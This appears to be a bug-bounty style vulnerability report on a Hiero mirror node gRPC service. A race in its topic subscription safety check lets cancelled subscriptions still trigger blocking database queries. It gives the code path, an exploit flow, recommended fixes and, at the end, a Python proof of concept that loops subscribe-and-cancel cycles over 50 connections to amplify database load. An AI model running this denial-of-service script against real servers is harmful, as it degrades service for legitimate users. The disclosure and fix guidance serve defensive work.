### Title
Safety-Check Race Condition Allows Unprivileged Users to Trigger Uninterruptible Database Queries After Subscription Cancellation

### Summary
In `TopicMessageServiceImpl.subscribeTopic()`, the `safetyCheck` Flux runs on a separate `Schedulers.boundedElastic()` thread and calls `missingMessages(topicContext, null)` after a 1-second delay. Because `TopicContext` carries no cancellation flag and the underlying retriever uses a synchronous blocking `getResultList()` call, an attacker who cancels their subscription at or after T=1s reliably causes a database query to execute to completion despite the subscription being cancelled. This can be repeated at scale to amplify database load.

### Finding Description

**Exact code path:**

`TopicMessageServiceImpl.java`, `subscribeTopic()`, lines 67–70:
```java
Flux<TopicMessage> safetyCheck = Mono.delay(Duration.ofSeconds(1L))
        .filter(_ -> !topicContext.isComplete())
        .flatMapMany(_ -> missingMessages(topicContext, null))
        .subscribeOn(Schedulers.boundedElastic());
```

When the 1-second timer fires, `flatMapMany` calls `missingMessages(topicContext, null)` (line 69), which — because `current == null` — unconditionally calls `topicMessageRetriever.retrieve(gapFilter, false)` (line 149):
```java
if (current == null) {
    ...
    return topicMessageRetriever.retrieve(gapFilter, false);
}
```

`PollingTopicMessageRetriever.retrieve()` (line 51–62) calls `poll(context)`, which calls:
```java
return Flux.fromStream(topicMessageRepository.findByFilter(newFilter));
```

`TopicMessageRepositoryCustomImpl.findByFilter()` (line 60) executes:
```java
return typedQuery.getResultList().stream();
```

`getResultList()` is a **synchronous, blocking JPA call**. Once it begins executing, Reactor's cancellation signal cannot interrupt it — the call runs to completion regardless.

**Root cause — three compounding failures:**

1. **No cancellation flag in `TopicContext`**: `doFinally(topicContext::finished)` only logs; it sets no flag that `missingMessages` or `retrieve` can check.
2. **Thread boundary via `subscribeOn(Schedulers.boundedElastic())`**: The cancellation signal must cross a thread boundary to reach the `safetyCheck` pipeline. The timer fires on the parallel scheduler; by the time cancellation propagates, `flatMapMany` has already dispatched `missingMessages`.
3. **Blocking retriever**: `typedQuery.getResultList()` is not reactive-cancellable. Even if the Reactor chain is cancelled, the JDBC/JPA call runs to completion.

**Why `isComplete()` does not help:**
```java
boolean isComplete() {
    if (filter.getEndTime() == null) {
        return false;   // always false for open-ended subscriptions
    }
    ...
}
```
For any subscription without an `endTime` (the common case), `isComplete()` always returns `false`, so the `filter` check on line 68 always passes.

**Exploit flow:**
1. Attacker subscribes to any valid topic (no privileges required) with no `endTime`.
2. Attacker waits T ≥ 1 second (e.g., 1.05s).
3. Attacker cancels the gRPC stream.
4. The `Mono.delay` has already fired; `flatMapMany` has already called `missingMessages → retrieve → poll → getResultList()`.
5. The blocking DB call runs to completion. With default config (`unthrottled.maxPolls=12`, `unthrottled.maxPageSize=5000`), up to 12 sequential DB queries each returning up to 5,000 rows execute per cancelled subscription.
6. Steps 1–5 are repeated across many connections.

### Impact Explanation
Each subscribe-then-cancel cycle after 1 second triggers up to 12 unthrottled database queries (default `unthrottled.maxPolls=12`) each scanning up to 5,000 rows (`unthrottled.maxPageSize=5000`). An attacker opening many concurrent connections (bounded only by `maxConcurrentCallsPerConnection=5` per connection, but unlimited connections) and cycling them every ~1 second can generate sustained, amplified database load, degrading or denying service to legitimate subscribers. No data is exposed and no funds are at risk, consistent with Medium severity.

### Likelihood Explanation
The attack requires no credentials or privileges — only the ability to open a gRPC connection to the mirror node's port 5600. The timing requirement (cancel after ≥1s) is trivially satisfied with any gRPC client. The attack is fully repeatable and scriptable. The only practical constraint is network access to the gRPC endpoint.

### Recommendation
1. **Add a cancellation flag to `TopicContext`**: Set a volatile boolean `cancelled` in `doFinally` (checking `SignalType.CANCEL`), and check it at the start of `missingMessages` before calling `retrieve`.
2. **Guard the safety check**: Check the cancellation flag inside the `flatMapMany` lambda before invoking `missingMessages`.
3. **Make the retriever non-blocking**: Replace `typedQuery.getResultList()` with a reactive/async query so that Reactor cancellation can propagate through the entire chain.
4. **Rate-limit subscriptions per client IP** at the gRPC layer to limit the amplification factor.

Example minimal fix for `TopicContext`:
```java
private volatile boolean cancelled = false;

void cancel() { this.cancelled = true; }
boolean isCancelled() { return cancelled; }
```
In `subscribeTopic()`:
```java
.doFinally(s -> { if (s == SignalType.CANCEL) topicContext.cancel(); subscriberCount.decrementAndGet(); })
```
In the `safetyCheck`:
```java
.filter(_ -> !topicContext.isComplete() && !topicContext.isCancelled())
```

### Proof of Concept
```python
import grpc, time, threading
# Assumes proto stubs generated from consensus_service.proto
from proto import consensus_service_pb2_grpc, consensus_service_pb2
from proto.basic_types_pb2 import TopicID

def attack_cycle(channel):
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    query = consensus_service_pb2.ConsensusTopicQuery(
        topicID=TopicID(topicNum=1)  # any valid topic
    )
    call = stub.subscribeTopic(query)
    time.sleep(1.05)   # wait for safety check timer to fire
    call.cancel()      # cancel — DB query already in flight

channels = [grpc.insecure_channel("mirror-node:5600") for _ in range(50)]
while True:
    threads = [threading.Thread(target=attack_cycle, args=(c,)) for c in channels]
    for t in threads: t.start()
    for t in threads: t.join()
    # Each iteration triggers up to 50 * 12 = 600 unthrottled DB queries
```
Observe in database logs: queries from `mirror_grpc` user continuing to execute after the gRPC stream is cancelled, with no corresponding active subscriber in the `hiero.mirror.grpc.subscribers` gauge.
